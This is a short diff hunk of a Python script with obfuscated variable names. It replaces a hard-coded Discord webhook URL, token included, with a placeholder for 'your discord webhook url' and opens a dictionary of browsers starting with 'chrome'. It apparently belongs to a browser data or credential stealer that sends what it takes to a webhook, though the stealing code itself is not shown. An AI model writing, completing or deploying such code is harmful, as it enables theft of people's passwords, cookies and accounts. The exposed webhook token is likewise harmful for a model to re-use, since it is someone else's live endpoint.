@@ -10,7 +10,7 @@ import requests
 import hashlib
 import re
 
-c2xG6J1 = "https://discord.com/api/webhooks/1297215069536649308/TDyPyTKAVLgR5bzMAdfDD5ca8UlkWYGz1IVcOvUyl_sE5Vah7rgkijWhrGl1DhPO4sfp"
+c2xG6J1 = "replace this with your discord webhook url"
 
 r3wD9E8 = {
     "chrome": {
